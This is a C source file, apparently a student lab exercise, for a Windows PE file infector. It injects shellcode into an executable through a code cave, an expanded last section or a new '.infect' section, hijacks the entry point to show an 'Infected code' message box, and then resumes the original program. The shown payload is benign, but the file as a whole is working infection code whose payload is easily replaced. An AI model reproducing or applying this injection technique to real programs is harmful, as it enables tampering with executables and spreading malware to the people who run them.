#include <windows.h>
#include <stdio.h>
#include "PEFile.h"
#include "utils.h"
#include <stdlib.h>
#include <time.h>
#include "code.h"

DWORD PositionOfSetCaptionInShellcode = POS_SET_CAP;
DWORD PositionOfSetTextInShellcode    = POS_SET_TEXT;
DWORD PositionOfCallInShellcode       = POS_CALL;
DWORD PositionOfJmp                   = POS_JMP;
UCHAR *Caption = "Infected code";
UCHAR *Text = "17520074 - 17520467";

int infectMessageBox(
    UCHAR *FileName, 
    UCHAR *NewFileName, 
    INT Mode
){
    FILE *FinHandle;
    FILE *FouHandle;
    UCHAR CurrentInputFileName[0xff];
    UCHAR tmpOutFileName[0xff];
    
    itoa(rand() * rand(), CurrentInputFileName, 10);
    FinHandle = fopen(FileName, "rb");
    FouHandle = fopen(CurrentInputFileName, "wb");
    copyFile(FouHandle, FinHandle, 0xfff);
    fclose(FinHandle);
    fclose(FouHandle);

    DWORD nBytesOfPlaceHold = 0x20;
    DWORD OffsetOfCaption = (int) endCode - (int) code + nBytesOfPlaceHold;
    DWORD OffsetOfText = OffsetOfCaption + strlen(Caption) * 2 + 2;
    DWORD LengthOfShellcode = OffsetOfText + strlen(Text) * 2 + 2 + 0x10;
    
    IMAGE_DOS_HEADER DOSHeader;
    IMAGE_NT_HEADERS32 NTHeaders;
    IMAGE_SECTION_HEADER SectionHeaders[MAX_SECTIONS];
    FinHandle = fopen(CurrentInputFileName, "rb");
    readPE32Header(FinHandle, &DOSHeader, &NTHeaders, SectionHeaders);
    fclose(FinHandle);

    IMAGE_SECTION_HEADER WhereSection; // Section which will be infected with shellcode
    DWORD Length;   // Length of code cave
    DWORD Offset;   // Offset of code cave in file
    
    FinHandle = fopen(CurrentInputFileName, "rb");
    if (Mode == 0) {
        printf("Using mode find code cave\n");
        Offset = findOffsetOfCodeCave(FinHandle, &WhereSection, &Length);
        fclose(FinHandle);
    }
    else if (Mode == 1) {
        printf("Using mode expand last section\n");

        itoa(rand() * rand(), tmpOutFileName, 10);
        FouHandle = fopen(tmpOutFileName, "wb");

        Offset = expandLastSection(FinHandle, FouHandle, LengthOfShellcode, 1);
        Length = LengthOfShellcode;
        WhereSection = SectionHeaders[NTHeaders.FileHeader.NumberOfSections - 1];

        fclose(FinHandle);
        fclose(FouHandle);

        remove(CurrentInputFileName);
        strcpy(CurrentInputFileName, tmpOutFileName);
    }
    else if (Mode == 2) {
        printf("Using mode add a section\n");
        itoa(rand() * rand(), tmpOutFileName, 10);

        FouHandle = fopen(tmpOutFileName, "wb");
        Offset = addEmptySection(FinHandle, FouHandle, ".infect", LengthOfShellcode, 1);
        
        fclose(FinHandle);
        fclose(FouHandle);

        remove(CurrentInputFileName);
        strcpy(CurrentInputFileName, tmpOutFileName);

        IMAGE_DOS_HEADER DOSHeader;
        IMAGE_NT_HEADERS32 NTHeaders;
        IMAGE_SECTION_HEADER SectionHeaders[MAX_SECTIONS];
        FILE *tmpF = fopen(CurrentInputFileName, "rb");
        readPE32Header(tmpF, &DOSHeader, &NTHeaders, SectionHeaders);
        fclose(tmpF);

        WhereSection = SectionHeaders[NTHeaders.FileHeader.NumberOfSections - 1];
        Length = WhereSection.SizeOfRawData;
    }
    else{
        printf("Invalid Mode 1. Find code cave  2. expand last section  3. add a section\n");
        remove(CurrentInputFileName);
        return 1;
    }
    
    if (Length < LengthOfShellcode){
        printf("Not enough memory to infect shellcode\n");
        remove(CurrentInputFileName);
        return 1;
    }    
    printf("Offset: 0x%x\nLength: %d\n", Offset, Length);

    // Adjust Address of Entry Point and save old Address of Entry Point
    itoa(rand() * rand(), tmpOutFileName, 10);
    FinHandle = fopen(CurrentInputFileName, "rb");
    FouHandle = fopen(tmpOutFileName, "wb");
    DWORD OldEntryPoint = adjustEntryPoint(FinHandle, FouHandle, Offset);
    fclose(FouHandle);
    fclose(FinHandle);
    remove(CurrentInputFileName);
    strcpy(CurrentInputFileName, tmpOutFileName);

    // Find Address of MessageBox
    // Have 2 version of MessageBox Function is A and W
    // Version A receive caption and text as char string
    // Version W receive caption and text as wchar string
    FinHandle = fopen(CurrentInputFileName, "rb");
    DWORD MesBoxAddress;
    char MesBoxSymbol;
    DWORD MesBoxWAddress = findFuncAddressByName(FinHandle, "USER32.dll", "MessageBoxW");
    DWORD MesBoxAAddress = findFuncAddressByName(FinHandle, "USER32.dll", "MessageBoxA");
    fclose(FinHandle);
    if (MesBoxAAddress){
        printf("Using MessageBoxA, Address: 0x%x\n", MesBoxAAddress);
        MesBoxAddress = MesBoxAAddress;
        MesBoxSymbol = 'A';
    }
    else if (MesBoxWAddress){
        printf("Using MessageBoxW, Address: 0x%x\n", MesBoxWAddress);
        MesBoxAddress = MesBoxWAddress;
        MesBoxSymbol = 'W';
    }
    else{
        printf("No MessageBox function for infect shellcode\n");
        remove(CurrentInputFileName);
        return 1;
    }
    // Copy shellcode to writable memory
    UCHAR *ShellCode = (UCHAR *) malloc(LengthOfShellcode);
    memset(ShellCode, 0, LengthOfShellcode);
    memcpy(ShellCode, code, (int) endCode - (int) code);

    // Adjust call messagebox instruction
    // Call to a direct address instead of a relative address
    UCHAR CallShellcode[6] = {0xff, 0x15, 0x00, 0x00, 0x00, 0x00}; 
    DWORD2AddressAsShellcode(MesBoxAddress, CallShellcode + 2);
    // Replace a normal call to direct call
    memDel(ShellCode, LengthOfShellcode, PositionOfCallInShellcode, 5);
    memIns(ShellCode, LengthOfShellcode, CallShellcode, 6, PositionOfCallInShellcode);
    
    // Adjust jmp instruction jump to old address of entrypoint
    // After ajusting call MessageBox instruction, position of below instructions increase 1
    PositionOfJmp += 1; 
    DWORD RVAOfJmp = Offset + PositionOfJmp - WhereSection.PointerToRawData + WhereSection.VirtualAddress;
    DWORD RelativeAddressToOldEntryPoint = OldEntryPoint - RVAOfJmp - 5;
    UCHAR JmpShellcode[5] = {0xE9, 0x00, 0x00, 0x00, 0x00};
    DWORD2AddressAsShellcode(RelativeAddressToOldEntryPoint, JmpShellcode + 1);
    // Edit jmp instruction
    memcpy(ShellCode + PositionOfJmp, JmpShellcode, 5);
    
    // Adjust RVA of Caption and Text Address
    DWORD Offset2RVA = -WhereSection.PointerToRawData + WhereSection.VirtualAddress + NTHeaders.OptionalHeader.ImageBase;
    DWORD RVAOfCaption = Offset + OffsetOfCaption + Offset2RVA;
    DWORD RVAOfText = Offset + OffsetOfText + Offset2RVA;
    
    UCHAR RVAOfCaptionAsShellcode[4];
    UCHAR RVAOfTextAsShellcode[4];
    DWORD2AddressAsShellcode(RVAOfCaption, RVAOfCaptionAsShellcode);
    DWORD2AddressAsShellcode(RVAOfText, RVAOfTextAsShellcode);

    memcpy(ShellCode + PositionOfSetCaptionInShellcode + 3, RVAOfCaptionAsShellcode, 4);
    memcpy(ShellCode + PositionOfSetTextInShellcode + 3, RVAOfTextAsShellcode, 4);

    // Put Caption and Text to Shellcode corresponding to version of MessageBox function
    if (MesBoxSymbol == 'A'){
        memcpy(ShellCode + OffsetOfCaption, Caption, strlen(Caption) + 1);
        memcpy(ShellCode + OffsetOfText, Text, strlen(Text) + 1);
    }
    else{
        unsigned short WCaption[0xff];
        unsigned short WText[0xff];
        char2Wchar(Caption, WCaption);
        char2Wchar(Text, WText);

        memcpy(ShellCode + OffsetOfCaption, WCaption,  strlen(Caption) * 2 + 2);
        memcpy(ShellCode + OffsetOfText, WText, strlen(Text) * 2 + 2);
    }
    
    // Infect shellcode to file
    FinHandle = fopen(CurrentInputFileName, "rb");
    FouHandle = fopen(NewFileName, "wb");
    infectShellcode(FinHandle, FouHandle, ShellCode, LengthOfShellcode, Offset);
    fclose(FinHandle);
    fclose(FouHandle);
    remove(CurrentInputFileName);
    return 0;
}

int main(int argc, char *argv[]){
    srand(time(NULL));

    char USAGE[0xff0];
    char *USAGE_FORMAT = 
    "USAGE:\n"
    "\t%s [PEFile] [NewPEFile] [MODE]\n"
    "OLIDGATORY ARGUMENTS:\n"
    "\tPEFile\t\tName of file which want to infect shellcode to it\n"
    "\tNewPEFile\tName of infected file\n"
    "MODE OPTIONS:\n"
    "\t-mode0\t\tInfect shellcode to a codecave (not change size of file) - By default\n"
    "\t-mode1\t\tExpand last section to infect shellcode\n"
    "\t-mode2\t\tAdd more one section to infect shellcode\n";

    sprintf(USAGE, USAGE_FORMAT, argv[0]);

    if (argc < 3 || argc > 4){
        printf(USAGE);
        return 1;
    }

    int Mode = 0;

    if (argc > 3){
        if(memcmp("-mode", argv[3], 5) == 0){
            Mode = atoi(argv[3] + 5);
            if (Mode < 0 && Mode > 2){
                printf(USAGE);
                return 1;
            }
        }
        else {
            printf(USAGE);
            return 1;
        }
    }

    if (stricmp(argv[1], argv[2]) == 0){
        printf("Input file and output file must not be the same\n");
        return 1;
    }

    infectMessageBox(argv[1], argv[2], Mode);
    return 0;
}